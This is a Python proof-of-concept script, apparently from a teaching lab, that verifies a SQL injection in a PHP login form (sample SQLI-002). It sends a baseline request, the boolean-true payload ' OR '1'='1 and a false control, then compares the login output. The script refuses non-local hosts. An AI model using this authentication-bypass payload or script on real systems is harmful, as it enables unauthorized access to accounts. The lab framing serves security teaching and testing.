#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SQLI-002 local verification draft (teaching lab).
# Data flow (local lines of normalized_samples/SQLI-002.php):
#   6    POST uname/passwd presence check
#   8-9  read both parameters
#   16   string interpolation into SELECT ... username='$uname' ... password='$passwd' ...
#   17   mysql_query executes the built SQL
#   25/27 row branch echoes Your Login name / Your Password and ../images/flag.jpg
#   35-38 empty branch prints mysql_error() and ../images/slap.jpg
# Status: DRAFT, not executed. --path must be supplied by the tester because the
# audit input does not state the deployed URL path. Local hosts only.

import argparse
import json
import re
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {'localhost', '127.0.0.1', '::1'}
TRUE_PAYLOAD = "' OR '1'='1"
FALSE_PAYLOAD = "' AND '1'='2"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def check_target(url):
    parts = urllib.parse.urlsplit(url)
    if parts.scheme not in ('http', 'https'):
        raise SystemExit('only http/https is allowed, got: %r' % parts.scheme)
    host = (parts.hostname or '').lower()
    if host not in ALLOWED_HOSTS:
        raise SystemExit('refusing non-local host %r (allowed: %s)' % (host, sorted(ALLOWED_HOSTS)))
    return url


def load_cookie(path):
    if not path:
        return None
    with open(path, 'r', encoding='utf-8') as fh:
        raw = fh.read().strip()
    if not raw:
        return None
    if raw.startswith('{'):
        obj = json.loads(raw)
        return obj.get('Cookie') or obj.get('cookie')
    return raw


def observe(body):
    match = re.search(r'Your Login name: *(.*?)<br', body, re.S)
    name = match.group(1).strip() if match else None
    return {
        'login_row_present': bool(name),
        'login_name_length_only': len(name) if name else None,
        'password_row_present': 'Your Password:' in body,
        'flag_image_marker': '../images/flag.jpg' in body,
        'slap_image_marker': '../images/slap.jpg' in body,
        'body_length': len(body),
    }


def post_form(url, fields, cookie, timeout):
    data = urllib.parse.urlencode(fields).encode('utf-8')
    req = urllib.request.Request(url, data=data, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    req.add_header('User-Agent', 'sqli002-poc-draft/1.0')
    if cookie:
        req.add_header('Cookie', cookie)
    opener = urllib.request.build_opener(NoRedirect())
    try:
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read(2000000).decode('utf-8', 'replace')
            return {'status': resp.getcode(), 'location': None, 'body': body, 'error': None}
    except urllib.error.HTTPError as exc:
        body = exc.read(2000000).decode('utf-8', 'replace') if exc.fp else ''
        return {'status': exc.code, 'location': exc.headers.get('Location'), 'body': body, 'error': 'http_error'}
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return {'status': None, 'location': None, 'body': '', 'error': '%s: %s' % (type(exc).__name__, exc)}


def run_case(label, url, fields, cookie, timeout):
    result = post_form(url, fields, cookie, timeout)
    obs = observe(result['body'])
    obs['case'] = label
    obs['http_status'] = result['status']
    obs['redirect_location'] = result['location']
    obs['transport_error'] = result['error']
    return obs


def main():
    parser = argparse.ArgumentParser(description='SQLI-002 SQL injection verification draft')
    parser.add_argument('--base-url', required=True, help='local lab base, e.g. http://127.0.0.1:8080')
    parser.add_argument('--path', required=True, help='deployed request path of the audited script; not given by the audit input')
    parser.add_argument('--uname-field', default='uname', help='parameter name from line 8 of the sample')
    parser.add_argument('--passwd-field', default='passwd', help='parameter name from line 9 of the sample')
    parser.add_argument('--uname-normal', default='sqli002_probe', help='dedicated test username for every case')
    parser.add_argument('--passwd-normal', default='sqli002_probe_only', help='baseline password, expected invalid')
    parser.add_argument('--true-payload', default=TRUE_PAYLOAD, help='boolean-true payload placed in the password field')
    parser.add_argument('--false-payload', default=FALSE_PAYLOAD, help='boolean-false control payload')
    parser.add_argument('--session-file', default=None, help='optional file with a Cookie header value or a JSON object with Cookie; the audited snippet uses no session')
    parser.add_argument('--timeout', type=float, default=10.0, help='per-request timeout in seconds')
    parser.add_argument('--out', default=None, help='optional path for the JSON observation report')
    args = parser.parse_args()

    base = check_target(args.base_url).rstrip('/')
    if not args.path.startswith('/'):
        raise SystemExit('--path must start with /, got: %r' % args.path)
    url = check_target(base + args.path)
    cookie = load_cookie(args.session_file)

    cases = [
        run_case('baseline_invalid', url, {args.uname_field: args.uname_normal, args.passwd_field: args.passwd_normal}, cookie, args.timeout),
        run_case('true_condition', url, {args.uname_field: args.uname_normal, args.passwd_field: args.true_payload}, cookie, args.timeout),
        run_case('false_condition', url, {args.uname_field: args.uname_normal, args.passwd_field: args.false_payload}, cookie, args.timeout),
    ]

    summary = {
        'target': {'base_url': base, 'path': args.path, 'method': 'POST', 'fields': [args.uname_field, args.passwd_field]},
        'executed_by_this_script': True,
        'cases': cases,
        'interpretation': {
            'true_vs_baseline_row_differs': bool(cases[1]['login_row_present']) and not bool(cases[0]['login_row_present']),
            'true_vs_false_row_differs': bool(cases[1]['login_row_present']) and not bool(cases[2]['login_row_present']),
            'note': 'row presence comes from the output written by lines 25/27; error text is not evidence because error_reporting(0) and the @ operator hide PHP warnings',
        },
    }
    print(json.dumps(summary, indent=2, ensure_ascii=False))
    if args.out:
        with open(args.out, 'w', encoding='utf-8') as fh:
            json.dump(summary, fh, indent=2, ensure_ascii=False)


if __name__ == '__main__':
    main()
